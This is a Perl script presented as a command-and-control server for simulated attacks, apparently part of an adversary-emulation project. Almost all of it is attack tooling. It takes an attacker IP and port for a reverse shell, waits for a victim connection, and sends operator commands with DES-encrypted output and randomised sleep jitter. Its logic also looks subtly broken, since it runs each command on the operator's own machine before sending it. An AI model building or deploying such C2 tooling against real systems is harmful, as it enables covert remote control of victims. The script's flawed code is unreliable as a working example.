#!/usr/bin/perl
# This Perl C2 server script enable to make remote communication by utilizes DES encryption for secure data transmission between the attacker server and the target.

# This C2 is for simulation only and is still under development
# perl C2-Server.pl
# Author: S3N4T0R
# Date: 2024-5-25

use strict;
use warnings;
use IO::Socket::INET;
use MIME::Base64;
use Crypt::DES;
use Time::HiRes qw(usleep);

my $WHITE = "\033[97m"; 
my $RESET = "\033[0m";

print $WHITE . qq(
██████╗ ██████╗ ██╗███╗   ███╗██╗████████╗██╗██╗   ██╗███████╗    ██████╗ ███████╗ █████╗ ██████╗ 
██╔══██╗██╔══██╗██║████╗ ████║██║╚══██╔══╝██║██║   ██║██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╔╝██████╔╝██║██╔████╔██║██║   ██║   ██║██║   ██║█████╗      ██████╔╝█████╗  ███████║██████╔╝
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██║   ██║   ██║╚██╗ ██╔╝██╔══╝      ██╔══██╗██╔══╝  ██╔══██║██╔══██╗
██║     ██║  ██║██║██║ ╚═╝ ██║██║   ██║   ██║ ╚████╔╝ ███████╗    ██████╔╝███████╗██║  ██║██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                                                                          
) . $RESET;

# Function to get attacker information
sub get_attacker_info {
    print "Enter the IP address for the reverse shell: ";
    my $attacker_ip = <STDIN>;
    chomp($attacker_ip);
    return $attacker_ip;
}

# Function to get port number
sub get_port {
    print "Enter the port number for the reverse shell: ";
    my $port = <STDIN>;
    chomp($port);
    return $port;
}

# Function to get DES key
sub get_des_key {
    print "Enter your DES key (must be 8 bytes long): ";
    my $key = <STDIN>;
    chomp($key);
    if (length($key) != 8) {
        print "Invalid key length. DES key must be 8 bytes long.\n";
        return get_des_key(); # Ask again recursively if length is not 8
    }
    return $key;
}

# Function to encrypt data
sub encrypt_data {
    my ($data, $key) = @_;
    my $cipher = Crypt::DES->new($key);
    my $data_padded = $data . ("\0" x (8 - length($data) % 8));
    my $encrypted = $cipher->encrypt($data_padded);
    return encode_base64($encrypted);
}

# Main function
sub main {
    my $ip = get_attacker_info();
    my $port = get_port(); # Get port number
    my $key = get_des_key(); # Get DES key

    # Create socket
    my $socket = IO::Socket::INET->new(
        LocalAddr => $ip,
        LocalPort => $port,
        Proto     => 'tcp',
        Listen    => 1,
        Reuse     => 1,
    ) or die "Cannot create socket: $!\n";

    print "Waiting for incoming connection...\n";
    my $client_socket = $socket->accept();


    while (1) {
        print "Enter a command to execute (or type 'exit' to quit): ";
        my $command = <STDIN>;
        chomp($command);
        last if $command eq 'exit';
        
        next unless $command; 

        my $result = `$command 2>&1`;
        $result = "" unless defined $result; # Ensure $result is defined
        my $encrypted_result = encrypt_data($result, $key); # Use DES key

        $client_socket->send($command . "\n" . $encrypted_result);
        usleep(int(rand(4) + 1) * 1000000); # Sleep for a random time between 1 and 5 seconds
    }

    close $client_socket;
    close $socket;
}

main();
